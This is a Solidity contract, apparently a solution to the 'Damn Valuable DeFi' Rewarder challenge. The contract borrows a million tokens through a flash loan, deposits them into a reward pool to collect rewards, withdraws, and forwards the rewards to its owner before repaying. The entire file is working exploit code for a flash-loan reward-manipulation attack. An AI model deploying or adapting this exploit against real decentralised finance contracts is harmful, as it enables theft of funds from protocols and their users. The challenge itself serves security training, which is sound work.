// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IFlashLoaner {
    function flashLoan(uint256 amount) external;
}

interface IRewarder {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);
}

contract ExploiterRewarder {
    IFlashLoaner public immutable flashLoaner;
    DamnValuableToken public immutable liquidityToken;
    IRewarder public immutable rewarder;
    address public immutable owner;
    ERC20 public immutable rewardToken;

    constructor(IFlashLoaner _flashLoaner, DamnValuableToken _token, IRewarder _rewarder, ERC20 _rewardToken) {
        owner = msg.sender;
        flashLoaner = _flashLoaner;
        liquidityToken = _token;
        rewarder = _rewarder;
        rewardToken = _rewardToken;
    }

    function attack() external {
        flashLoaner.flashLoan(1_000_000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.distributeRewards();
        rewarder.withdraw(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(address(flashLoaner), amount);
    }
}
